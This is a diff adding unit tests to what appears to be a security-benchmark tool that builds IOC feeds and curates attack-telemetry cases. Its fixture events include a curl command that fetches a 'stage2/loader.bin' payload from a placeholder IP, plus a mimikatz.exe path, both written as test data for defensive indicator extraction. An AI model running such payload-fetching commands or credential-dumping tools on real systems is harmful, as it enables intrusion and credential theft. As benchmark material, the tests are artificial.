@@ -175,8 +175,56 @@ class BenchmarkIocTests(unittest.TestCase):
         tok_fqdn = pseudo.pseudonymize('host', 'UTICA.dmevals.local')
         tok_short = pseudo.pseudonymize('host', 'UTICA')
         self.assertEqual(tok_fqdn, tok_short)
-        cleaned = pseudo.clean_content('Session from UTICA to UTICA.dmevals.local')
+        cleaned = pseudo.clean_content(r'Session from \\UTICA\C$ to \\UTICA.dmevals.local\ADMIN$')
         self.assertEqual(cleaned.count(tok_fqdn), 2)
+
+        # URL command-line extraction emits valid url_path + ipv4/domain, and known_ioc_pivot filters downstream catalog matches
+        url_ev = {
+            'case_id': 'case-cafe1234',
+            'window_utc': {'start_inclusive': '2026-01-01T00:00:00Z', 'end_exclusive': '2026-01-01T01:00:00Z'},
+            'events': [
+                {'event_id': 'e1', 'fields': {'timestamp_original': '2026-01-01T00:00:01Z',
+                                              'CommandLine': 'curl https://198.51.100.77/stage2/loader.bin'}},
+                {'event_id': 'e2', 'fields': {'timestamp_original': '2026-01-01T00:05:00Z',
+                                              'Image': r'C:\Temp\mimikatz.exe'}},
+            ],
+        }
+        url_tr = {'steps': [
+            {'step_id': 's1', 'window_utc': {'start_inclusive': '2026-01-01T00:00:01Z', 'end_exclusive': '2026-01-01T00:00:10Z'},
+             'support_sets': [['e1']]},
+            {'step_id': 's2', 'window_utc': {'start_inclusive': '2026-01-01T00:05:00Z', 'end_exclusive': '2026-01-01T00:05:10Z'},
+             'support_sets': [['e2']]},
+        ]}
+        url_entries, url_manifest = build_case_ioc_feed(url_ev, url_tr, regime='known_ioc_pivot')
+        self.assertGreaterEqual(len(url_manifest['active_entry_indicators']), 1)
+        active_vals = {e['indicator_value'].lower() for e in url_entries if e['status'] == 'active'}
+        self.assertNotIn('mimikatz.exe', active_vals)
+
+        # Partially missing conjunctive support_tags list is rejected rather than weakened
+        conj_out = self.root / 'conj_out'
+        conj_out.mkdir()
+        base_cov = dict(load_json(FIXTURES / 'fixtures' / 'case-8b42' / 'scenario.json')['coverage'], os=['linux'])
+        with self.assertRaises(BenchmarkError) as conj_ctx:
+            write_curated_case(
+                conj_out, case_seed='conj-seed', family_id='fam-conj', split='development',
+                provenance='public_replay', coverage_tags=base_cov,
+                difficulty_factors={k: {'score': 0, 'rationale': 'r'} for k in ('noise', 'joins', 'time_span', 'gaps', 'ambiguity')},
+                sophistication={'band': 'S1', 'boundaries': [{'boundary_id': 'b1', 'kind': 'host'}]},
+                source_references=['https://example.com/ref'],
+                assets=[{'asset_id': 'h1', 'os_family': 'linux', 'os_version': '12', 'architecture': 'x86_64', 'vendor': 'debian'}],
+                sources=[{'source_id': 'src1', 'asset_ids': ['h1'], 'telemetry': None, 'clock_offset_seconds': 0,
+                          'clock_uncertainty_seconds': 1, 'sensor_version': '1', 'config_version': '1',
+                          'completeness': 'complete', 'source_sha256': 'a' * 64}],
+                raw_events=[{'tag': 'present_a', 'timestamp_utc': '2026-01-01T00:00:05Z', 'source_id': 'src1',
+                             'asset_id': 'h1', 'event_type': 'syslog', 'record_id': '1',
+                             'fields': {'timestamp_original': '2026-01-01T00:00:05Z', 'msg': 'hello'}}],
+                step_specs=[{'step_id': 'step-1', 'asset_id': 'h1', 'technique_id': 'T1082',
+                             'boundary_id': 'b1', 'phase': 'initial', 'support_tags': [['present_a', 'missing_b']]}],
+                edges=[], pseudonymizer=CasePseudonymizer(salt='fedcba9876543210fedcba9876543210'),
+                control_case=False,
+            )
+        self.assertEqual(conj_ctx.exception.code, 'empty_support_sets')
+        self.assertEqual(list(conj_out.iterdir()), [])
 
         # known_ioc_pivot fails when truth steps contain zero extractable non-benign indicators
         empty_ev = {
